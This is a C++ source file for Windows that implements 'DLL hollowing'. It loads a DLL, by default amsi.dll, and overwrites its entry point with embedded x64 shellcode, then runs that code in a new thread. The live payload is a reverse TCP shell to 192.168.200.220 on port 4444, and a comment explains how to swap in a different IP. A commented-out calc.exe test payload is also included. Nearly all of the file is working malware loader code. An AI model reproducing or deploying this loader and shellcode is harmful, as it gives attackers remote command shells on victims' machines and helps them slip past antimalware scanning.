#include <windows.h>
#include <winbase.h>
#include <stdio.h>
#include <cstring>
#include <cstdlib>
#include <winternl.h>

typedef unsigned __int64 QWORD;
void HexDump ( const char * desc, const void * addr, const int len, int perLine); // Function to print out hex dump of a buffer
char* GetLastErrorAsString();


int main(int args, char *argc[]) // TODO: Implement the actual check
{
	char dllName[256] = {};  // Buffer to hold the dll name to inject into the process

    if (args != 2)
    {
        printf("Usage:: dll_hollowing.exe <dll name>\n"); // amsi.dll is the default dll name
		memcpy( dllName, "amsi.dll",9); // default dll name to inject into the process
    }
    else
    {
		memcpy( dllName, argc[2],strlen(argc[2]) ); // dll name to inject into the process
    }
    printf("C2 IP:\t\t192.168.200.220\nDll Name:\t%s\n", dllName );  // x64 reverse tcp shell ip

// x64 calc.exe
//unsigned char buff[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
// x64 reverse tcp shell ip 192.168.200.220 port 4444 // Not packed so search for c0\xa8\xc8\xdc to replace the IP 
	unsigned char buff[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\xc8\xdc\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"; // Not packed so search for c0\xa8\xc8\xdc to replace the IP 
    int encoded_size = sizeof(buff);  // Size of the shellcode buffer
	unsigned char *buf = (unsigned char*)malloc(encoded_size); // Buffer to hold the deobfuscated shellcode
	memset( buf, 0, encoded_size ); // Zero out the buff
	memcpy( buf, buff, encoded_size ); // copy the shellcode into the buffer
//    End Shellcode deobfuscation
    // DLL Hollowing
	DWORD saveProtect = 0;  // Variable to hold the old memory protection
	HMODULE hTargetDLL = LoadLibrary( dllName ); // Load the DLL into memory and get a handle to it
	if ( hTargetDLL == NULL)  // If the DLL failed to load, exit
	{
		printf("[!] LoadLibrary failed to load %s\n", dllName);  // TODO: Implement the actual check 
		return 0;
	}
	PIMAGE_DOS_HEADER mzHeader = (PIMAGE_DOS_HEADER) hTargetDLL;  // Get the DOS header of the DLL
	PIMAGE_NT_HEADERS peHeader = (PIMAGE_NT_HEADERS) ( (char*)hTargetDLL + mzHeader->e_lfanew); // Get the PE header of the DLL
	void *entryPointDLL = (void*)((char*)hTargetDLL + peHeader->OptionalHeader.AddressOfEntryPoint ); // Get the entrypoint of the DLL
	
	printf("%s DLL entrypoint address is (%p)\n", dllName, entryPointDLL ); // Print out the entrypoint of the DLL

	VirtualProtect( entryPointDLL, encoded_size, PAGE_READWRITE, &saveProtect ); // Change the memory protection of the entrypoint of the DLL to PAGE_READWRITE
	memcpy( entryPointDLL, buf, encoded_size ); // Copy the shellcode into the entrypoint of the DLL
	VirtualProtect( entryPointDLL, encoded_size, saveProtect, &saveProtect ); // Restore the memory protection of the entrypoint of the DLL to its original value
	CreateThread( 0, 0, (LPTHREAD_START_ROUTINE)entryPointDLL, NULL, 0, 0 ); // Create a thread to execute the shellcode
	printf("Thread Created\n"); // Print out that the thread was created

	while (true )
	{
		if (getchar() == 'q') 
		{
			printf("Recieved an exit command\n");
			break;	
		}
	}
	printf("Exiting\n");
	return 1;
}

// Usage:
//     HexDump(desc, addr, len, perLine);
//         desc:    if non-NULL, printed as a description before hex dump.
//         addr:    the address to start dumping from.
//         len:     the number of bytes to dump.
//         perLine: number of bytes on each output line.

void HexDump ( const char * desc, const void * addr, const int len, int perLine) // Function to print out hex dump of a buffer
{
    // Silently ignore silly per-line values.

    if (perLine < 4 || perLine > 64) perLine = 16;

    int i;
    unsigned char buff[perLine+1];
    const unsigned char * pc = (const unsigned char *)addr;

    // Output description if given.

    if (desc != NULL) printf ("%s:\n", desc);

    // Length checks.

    if (len == 0) {
        printf("  ZERO LENGTH\n");
        return;
    }
    if (len < 0) {
        printf("  NEGATIVE LENGTH: %d\n", len);
        return;
    }

    // Process every byte in the data.

    for (i = 0; i < len; i++) {
        // Multiple of perLine means new or first line (with line offset).

        if ((i % perLine) == 0) {
            // Only print previous-line ASCII buffer for lines beyond first.

            if (i != 0) printf ("  %s\n", buff);

            // Output the offset of current line.

            printf ("  %04x ", i);
        }

        // Now the hex code for the specific character.

        printf (" %02x", pc[i]);

        // And buffer a printable ASCII character for later.

        if ((pc[i] < 0x20) || (pc[i] > 0x7e)) // isprint() may be better.
            buff[i % perLine] = '.';
        else
            buff[i % perLine] = pc[i];
        buff[(i % perLine) + 1] = '\0';
    }

    // Pad out last line if not exactly perLine characters.

    while ((i % perLine) != 0) {
        printf ("   ");
        i++;
    }

    // And print the final ASCII buffer.

    printf ("  %s\n", buff);
}
//Returns the last Win32 error, in string format. Returns an empty string if there is no error.
char* GetLastErrorAsString()
{
    //Get the error message ID, if any.
    DWORD errorMessageID = ::GetLastError();
    if(errorMessageID == 0) {
        return NULL;
    }
    
    LPSTR messageBuffer = NULL;

    //Ask Win32 to give us the string version of that message ID.
    //The parameters we pass in, tell Win32 to create the buffer that holds the message for us (because we don't yet know how long the message string will be).
    size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                                 NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
    
    return messageBuffer;;
}
